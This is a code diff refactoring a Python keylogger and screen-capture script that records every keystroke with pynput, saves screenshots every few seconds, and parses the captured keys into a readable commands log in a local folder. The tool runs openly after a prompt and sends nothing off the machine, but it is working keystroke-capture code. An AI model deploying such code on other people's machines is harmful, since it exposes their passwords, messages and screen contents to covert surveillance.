@@ -1,21 +1,18 @@
 """ Import built-in modules """
-import pathlib
 import re
 import sys
 import time
-import os
 from multiprocessing import Process
+from pathlib import Path
 # Import third-party modules #
 from PIL import ImageGrab
 from pynput.keyboard import Key, Listener
 
 
-# Pseudo constants #
-WAIT_TIME = 3
-
 # Global variables #
 global KEY_FILE, SCREENSHOT
 LAST_PIC = 0
+WAIT_TIME = 3
 
 
 def on_press(key):
@@ -46,7 +43,7 @@ def on_press(key):
 
     return True
 
-def screenshots(path: str):
+def screenshots(path: Path):
     """
     Loop that actively takes screenshots based on wait time interval.
 
@@ -61,24 +58,24 @@ def screenshots(path: str):
 
         while True:
             # Format screenshot to number of last capture #
-            pic_path = f'{path}Screenshot{LAST_PIC}.png'
+            pic_path = path / f'Screenshot{LAST_PIC}.png'
 
             # If file name is unique #
-            if not os.path.isfile(pic_path):
+            if not pic_path.exists():
                 # Save the picture as png #
                 pic.save(pic_path)
                 # Increment static count #
                 LAST_PIC += 1
                 break
 
-            # Increment static count #
+            # Increment picture count #
             LAST_PIC += 1
 
         # Sleep execution by time interval #
         time.sleep(WAIT_TIME)
 
 
-def regex_formatting(path: str):
+def regex_formatting(path: Path):
     """
     Parses the logged pynput keys into human-readable format.
 
@@ -98,12 +95,13 @@ def regex_formatting(path: str):
                             :.<\d+>>''', re.X)
 
     regex3 = re.compile(r'[^\S\r\n]')
-    regex4 = re.compile(r'.<Key\.backspace:<\d+>>')
+    regex4 = re.compile(r'<Key\.backspace:<8>>')
     regex5 = re.compile(r'<Key\.space:>')
+    cmd_path = file_path / 'commands.txt'
 
     # Open un-formatted file #
     try:
-        with open(f'{path}keys.txt', encoding='utf-8') as parse_file:
+        with path.open('r', encoding='utf-8') as parse_file:
             # Iterate line by line #
             for line in parse_file:
                 # Perform a series of parsing substitutions #
@@ -114,13 +112,14 @@ def regex_formatting(path: str):
                 result = re.sub(regex5, r' ', str(sub4))
 
                 # Open the result command log file #
-                with open(f'{path}commands.txt', 'a', encoding='utf-8') as final_log:
+                with cmd_path.open('a', encoding='utf-8') as final_log:
                     # Write parsed result to file #
                     final_log.write(result)
 
     # If error occurs during file operation #
     except (IOError, OSError) as file_err:
-        print(f'\n* [ERROR] Error occurred writing to file: {file_err}', file=sys.stderr)
+        # Print error and exit #
+        print_err(f'Error occurred during regex parsing file operation: {file_err}')
         sys.exit(3)
 
 
@@ -132,62 +131,63 @@ def main():
     """
     global KEY_FILE, SCREENSHOT
 
-    input('Please hit enter to begin or ctrl+c to stop ')
-    print('\nNow taking screenshots, hit escape to stop')
+    key_path = file_path / 'keys.txt'
+    input('[+] Please hit enter to begin or ctrl+c to stop ')
+    print('[!] Now taking screenshots, hit escape to stop\n')
 
     try:
         # Open the file to record keystrokes #
-        with open(f'{file_path}keys.txt', 'a', encoding='utf-8') as KEY_FILE:
+        with key_path.open('a', encoding='utf-8') as KEY_FILE:
             # Create the key listener and screenshot taker #
             key_listener = Listener(on_press=on_press)
             SCREENSHOT = Process(target=screenshots, args=(file_path,))
-
             # Start the processes #
             key_listener.start()
             SCREENSHOT.start()
-
             # Join the processes #
             key_listener.join(600.0)
             SCREENSHOT.join(timeout=600)
 
     # If error occurs during file operation #
     except (IOError, OSError) as file_err:
-        print(f'\n* [ERROR] Error occurred writing to file: {file_err}', file=sys.stderr)
+        # Print error and exit #
+        print_err(f'Error occurred during file operation logging keys: {file_err}')
         sys.exit(2)
 
     # Call the function to parse key logs to readable format #
-    regex_formatting(file_path)
-
-    print()
+    regex_formatting(key_path)
     main()
+
+
+def print_err(msg: str):
+    """
+    Displays the passed in error message via stderr the durations on seconds passed in.
+
+    :param msg:  The error message to be displayed.
+    :return:  Nothing
+    """
+    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)
 
 
 if __name__ == '__main__':
     # List for recording key presses #
     KEYS = []
     # Get the current working directory #
-    cwd = os.getcwd()
-
-    # If OS is Windows #
-    if os.name == 'nt':
-        file_path = f'{cwd}\\ResultDock\\'
-    # Linux #
-    else:
-        file_path = f'{cwd}/ResultDock/'
-
+    cwd = Path('.')
+    file_path = cwd / 'ResultDock'
     # Create storage directory #
-    pathlib.Path(file_path).mkdir(parents=True, exist_ok=True)
+    Path(str(file_path.resolve())).mkdir(parents=True, exist_ok=True)
 
     try:
         main()
 
     # If Ctrl + c is detected #
     except KeyboardInterrupt:
-        print('* Ctrl-C detected ... exiting program *')
+        print('\n[!] Ctrl-C detected ... exiting program')
 
     # If unknown system exception occurs #
     except Exception as ex:
-        print('\n* [ERROR] Unknown exception occurred: %s *', ex, file=sys.stderr)
+        print_err(f'Unknown exception occurred: {ex}')
         sys.exit(1)
 
     sys.exit(0)
